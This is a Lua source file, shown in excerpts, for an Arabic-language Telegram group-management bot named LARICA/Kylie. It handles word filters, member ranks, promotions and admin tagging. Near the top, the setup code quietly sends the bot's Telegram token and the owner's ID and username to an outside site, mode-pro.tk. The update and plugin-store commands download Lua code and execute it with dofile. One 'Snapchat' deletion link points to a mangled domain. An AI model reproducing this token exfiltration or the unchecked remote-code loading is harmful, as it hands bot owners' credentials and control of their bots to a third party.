...
https.request('http://mode-pro.tk/LARICA/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("LARICA", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/LARICA
token="]]..database:get(id_server..":token")..[["
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/LARICA-TEAM/Files_LARICA/main/File_Bot/commands.lua") 
...
local LARICA_Msg = ''  
if msgs < 100 then 
LARICA_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
LARICA_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
LARICA_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
LARICA_Msg = 'متفاعل' 
elseif msgs < 1200 then 
LARICA_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
LARICA_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
LARICA_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
LARICA_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
LARICA_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
LARICA_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
LARICA_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
LARICA_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
LARICA_Msg = 'رب التفاعل'  
end 
return LARICA_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceLARICA(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,LARICA_Msg) 
return false  
end 
if text then    
...
os.execute('wget https://raw.githubusercontent.com/LARICATEAM/LARICA/main/LARICA.lua')
send(msg.chat_id_, msg.id_,' ꙳.︙تم تحديث السورس \n ꙳.︙لديك اخر اصدار لسورس كايلي\n ꙳.︙الاصدار » { v 1.6 }')
dofile('LARICA.lua')  
end
if text == 'الاصدار ꙳.' and Devmode(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ꙳.︙اصدار سورس كايلي \n ꙳.︙الاصدار »{ v 1.6 }')
end
...
-------------
if text == "꙳. تحديثات سورس كايلي ꙳." and Devmode(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس كايلي*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙏𝙚𝘼𝙢 𝙆𝙮𝙡𝙞𝙚', url="t.me/P222P"}},
}
...
send(msg.chat_id_, msg.id_,'꙳.︙عدد الكروبات الان » { '..#group..' }'..LARICAk..''..LARICA..'\n꙳.︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and Devmode(msg) then
...
if text and text:match("^رفع مطور (%d+)$") and Devmode(msg) then
...
if text and text:match("^تنزيل مطور @(.*)$") and Devmode(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and Devmode(msg) then
...
local LARICA1_Msg = database:get(bot_id.."LARICA1:Add:Filter:Rp2"..text..msg.chat_id_)   
if LARICA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꙳.︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'ppppd')..') \n ꙳.︙'..LARICA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if LARICA_Msg and not Special(msg) then  
local LARICA_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if LARICA_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ꙳.︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ꙳.︙["..LARICA_Msg.."] \n")
else
send(msg.chat_id_,0," ꙳.︙العضو : {["..data.first_name_.."](T.ME/ppppd)}\n ꙳.︙["..LARICA_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ꙳.︙عذرا » {["..data.first_name_.."](T.ME/ppppd)}\n ꙳.︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."LARICA:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."LARICA:blocname"..msg.chat_id_)
...
if name_MRmode then 
names_MRmode = database:smembers(bot_id.."LARICA:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."LARICA:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."LARICA:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."LARICA:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."LARICA:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."LARICA:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function mode_mrmode_new(mrmode1,mrmode2)
if mrmode2 and mrmode2.first_name_ then 
if mrmode2.first_name_:match("(.*)"..database:get(bot_id.."LARICA:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."LARICA:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrmode_nnn = database:get(bot_id.."LARICA:nump"..msg.chat_id_) or 5
local mrmode_nnn2 = database:get(bot_id.."LARICA:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrmode_nnn2) == tonumber(mrmode_nnn) or tonumber(mrmode_nnn2) > tonumber(mrmode_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."LARICA:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "꙳.︙عزيزي >>["..mrmode2.username_.."](https://t.me/"..(mrmode2.username_ or "ppppd")..")\n꙳.︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."LARICA:teh"..msg.chat_id_).."} بجانب اسمك\n꙳.︙عدد المحاولات المتبقيه {"..(tonumber(mrmode_nnn) - tonumber(mrmode_nnn2)).."}")
end
end
end
end
...
local LARICAChengName = database:get(bot_id.."LARICA:Cheng:Name"..data.id_)
if not data.first_name_ then 
if LARICAChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..LARICAChengName..']')
database:del(bot_id.."LARICA:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if LARICAChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."LARICA:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local LARICAChengUserName = database:get(bot_id.."LARICA:Cheng:UserName"..data.id_)
if not data.username_ then 
if LARICAChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..LARICAChengUserName..']')
database:del(bot_id.."LARICA:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if LARICAChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."LARICA:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local LARICAChengPhoto = database:get(bot_id.."LARICA:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if LARICAChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."LARICA:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if LARICAChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."LARICA:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꙳.︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ppppd')..') \n ꙳.︙تـم قفـل التاك بالكتم ')
end,nil)   
...
if Devmode(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/LARICA-TEAM/Files_LARICA/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ꙳.︙اهلا بك في متجر ملفات كايلي\n ꙳.︙ملفات السورس ↓\n⋆ ┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉ ⋆\n\n"
local TextE = "\n⋆ ┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉ ⋆\n ꙳.︙علامة تعني { ✔️ } ملف مفعل\n ꙳.︙علامة تعني { ✖ } ملف معطل\n ꙳.︙قناة سورس كايلي ↓\n".." ꙳.︙[اضغط هنا لدخول](t.me/ppppd) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/LARICA-TEAM/Files_LARICA/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('LARICA.lua')  
else
send(msg.chat_id_, msg.id_," ꙳.︙عذرا الملف لايدعم سورس كايلي \n") 
end
return false
end
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and Devmode(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local UserName = (b.username_ or "LARICA-TEAM")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ꙳.︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ppppd')..')'
status  = '\n ꙳.︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ꙳.︙العضو » '..userid..''
...
database:set(bot_id.."LARICA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."LARICA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ꙳.︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."LARICA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."LARICA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."LARICA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."LARICA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ꙳.︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."LARICA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."LARICA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."LARICA1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."LARICA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ꙳.︙ارسل الكلمه الان")  
database:set(bot_id.."LARICA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."LARICA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."LARICA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."LARICA1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."LARICA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."LARICA1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."LARICA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."LARICA1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."LARICA1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ꙳.︙قائمة المنع \n⋆ ┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉ ⋆\n"
for k,v in pairs(list) do  
local LARICA_Msg = database:get(bot_id.."LARICA1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..LARICA_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'كايلي').."" then  
...
send(msg.chat_id_, msg.id_,'['..LARICA_Msg[math.random(#LARICA_Msg)]..']') 
return false
end
...
database:set(bot_id.."ppppd:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"꙳.︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."ppppd:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."ppppd:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس كايلي يعني لو بكتهن راح اعرفك انت الاخذتهن
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'كايلي').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'ppppd')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
LARICAdx(msg.chat_id_, msg.id_, ' ꙳.︙ايدي المجموعة » ( '..msg.chat_id_..' )\n ꙳.︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ꙳.︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n ꙳.︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
≪─━─━─𝙎𝙉━─━─≫
 ...
 ꙳. رابط حذف [Snspchat](https://accounts.LARICAchat.com/accounts/login?continue=https%3A%2F%2Faccounts.LARICAchat.com%2Faccounts%2Fdeleteaccount) ܁
]]
send(msg.chat_id_, msg.id_,t) 
return false
end
...
LARICA = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(LARICA)
...
--------------------------------------------------------------------------------------------------------------
SourceLARICA(data.message_,data)
plugin_LARICA(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local LARICAAbot = database:get(bot_id.."LARICA1:Add:Filter:Rp2"..text..result.chat_id_)   
if LARICAAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ꙳.︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ꙳.︙["..LARICAAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local LARICA1_Msg = database:get(bot_id.."LARICA1:Add:Filter:Rp2"..text..result.chat_id_)   
if LARICA1_Msg then    
send(msg.chat_id_, msg.id_," ꙳.︙"..LARICA1_Msg)
